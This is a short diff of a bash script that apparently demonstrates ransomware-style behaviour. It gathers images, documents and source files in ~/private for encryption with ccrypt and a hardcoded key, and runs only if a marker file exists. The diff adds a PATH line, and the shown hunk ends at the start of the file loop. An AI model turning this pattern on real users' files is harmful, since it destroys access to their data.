@@ -1,11 +1,12 @@
 #!/bin/bash
 FOLDER="${HOME}"/private
+export PATH=$PATH":/opt/homebrew/bin:/opt/homebrew/sbin"
 KEY=cybersec42
 # Security check: if the file .quierollorar doesn't exist, exit.
 if [ ! -e "${FOLDER}"/.quierollorar ]; then
 	exit
 fi
-ccrypt --version &>/dev/null || brew install ccrypt 
+ccrypt --version &>/dev/null || brew install ccrypt
 # Find all files with specific extension
 FILES=$(find -E "${FOLDER}" -regex ".*\.(jpg|gif|png|jpeg|pdf|doc|docx|png|txt|c|cpp)")
 for file in $FILES; do
